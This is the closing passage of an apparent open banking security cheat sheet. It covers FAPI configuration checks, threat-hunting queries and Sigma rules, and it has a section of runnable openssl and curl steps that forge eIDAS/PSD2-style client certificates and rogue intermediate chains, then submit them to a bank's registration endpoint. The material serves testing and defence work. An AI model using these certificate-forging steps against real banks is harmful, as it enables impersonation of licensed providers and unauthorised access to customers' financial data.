  local url=$1
  local cfg=$(curl -s "$url/.well-known/openid-configuration")
  echo "$cfg" | jq -r '{
    PAR: (.require_pushed_authorization_requests // false),
    mTLS: (.token_endpoint_auth_methods_supported // [] | contains(["tls_client_auth"])),
    DPoP: (.dpop_signing_alg_values_supported // null),
    JARM: (.response_modes_supported // [] | contains(["jwt"])),
    algs: (.id_token_signing_alg_values_supported // []),
    aCR: (.acr_values_supported // [])
  }'
}
fapi_profile https://auth.example.com
```

```bash
# Detection: spot FAPI-2 violators (no PAR / no mTLS / allows none alg)
for h in $(cat aspsps.txt); do
  cfg=$(curl -sk "https://$h/.well-known/openid-configuration")
  par=$(echo "$cfg" | jq -r '.require_pushed_authorization_requests // false')
  algs=$(echo "$cfg" | jq -r '.id_token_signing_alg_values_supported // [] | join(",")')
  echo "$h PAR=$par algs=$algs" >> fapi-audit.tsv
done
```

---

## §20. eIDAS QWAC/QTSP Certificate Attacks

```bash
# Forge eIDAS-style cert ( rogue OID 2.5.4.15 = PSD2 )
openssl req -new -key rogue.key -out rogue.csr \
  -subj "/C=GB/O=RogueTPP/CN=Rogue TPP PSD2/OID.2.5.4.15=PSD2-PISP/OID.1.3.6.1.4.1.311.60.2.1.3=GB"

# Self-sign
openssl x509 -req -in rogue.csr -signkey rogue.key -out rogue.crt -days 365 \
  -extfile <(printf "extendedKeyUsage=clientAuth,serverAuth\nsubjectAltName=DNS:tpp.example.com")

# Test if ASPSP accepts rogue cert
curl -sk --cert rogue.crt --key rogue.key \
  https://as.example.com/register/v1.1/register/ -d @ssa.jwt
```

```python
# Verify PSD2 Organizational Identifier (PSD2 OID 2.5.4.15)
from cryptography import x509
from cryptography.x509.oid import ObjectIdentifier

def check_psd2_oids(cert_path):
    cert = x509.load_pem_x509_certificate(open(cert_path, 'rb').read())
    try:
        org_id = cert.extensions.get_extension_value_for_oid(
            ObjectIdentifier("2.5.4.15")
        )
        return org_id.value
    except x509.ExtensionNotFound:
        return None
```

```bash
# Chain confusion: rogue intermediate signed by attacker root
# Generate rogue intermediate
openssl req -new -key rogue-int.key -out rogue-int.csr \
  -subj "/C=GB/O=RogueIntermediate"
openssl x509 -req -in rogue-int.csr -CA rogue-root.crt -CAkey rogue-root.key \
  -CAcreateserial -out rogue-int.crt -days 365

# Sign leaf cert with rogue intermediate
openssl x509 -req -in rogue.csr -CA rogue-int.crt -CAkey rogue-int.key \
  -out rogue.crt -days 365
```

---

## §21. Open Banking Threat Hunting Queries

```sql
-- Splunk SPL: AIS read after consent revoke
index=openbanking endpoint="/accounts/*"
| eval revoked_time = strptime(consent.revoked_at, "%Y-%m-%dT%H:%M:%S%Z")
| eval request_time = _time
| where request_time > revoked_time
| stats count by client_id, account_id, consent_id

-- Kusto KQL: refresh token rotation loop
OpenBankingTokens
| where GrantType == "refresh_token"
| summarize rt_count = count() by RefreshTokenFamily, bin(TimeGenerated, 1h)
| where rt_count > 5

-- SQL: detect mTLS thumbprint mismatch
SELECT token_id, issued_to_cn, request.cn, count(*)
FROM token_issuance t
JOIN request_log r ON t.token_id = r.token_id
WHERE t.client_cert_thumbprint != r.client_cert_thumbprint
GROUP BY token_id, issued_to_cn, request.cn;
```

```python
# Sigma rule for AIS brute-force
sigma = {
    "title": "Open Banking AIS brute-force on account IDs",
    "logsource": {"product": "openbanking", "service": "ais"},
    "detection": {
        "selection": {
            "endpoint": "/accounts/*",
            "response_code": ["401", "403", "404"]
        },
        "timeframe": "5m",
        "condition": "selection | count() by client_id > 100"
    },
    "level": "high"
}
```

---

## References

- OpenID FAPI 2.0 — https://openid.net/specs/fapi-2_0.html
- FAPI 1.0 Advanced — https://openid.net/specs/openid-financial-api-part-2-1_0.html
- OAuth 2.0 PAR (RFC 9126)
- OAuth 2.0 DPoP (RFC 9449)
- OAuth 2.0 mTLS (RFC 8705)
- UK Open Banking — https://standards.openbanking.org.uk/
- PSD2 — https://eur-lex.europa.eu/eli/dir/2015/2366/oj
- EBA RTS SCA — https://www.eba.europa.eu/regulation-and-policy/psd2-and-strong-customer-authentication
- Brazil Open Finance — https://openfinancebrasil.org.br/
- US FDX — https://financialdataexchange.org/
- India AA — https://sahamati.org.in/
- Australia CDR — https://consumerdatastandards.gov.au/
- OWASP FAPI Cheat Sheet
- CISA — *Open Banking Threat Brief* (2024)
- "Open Banking Security" (Canhoto, 2024)
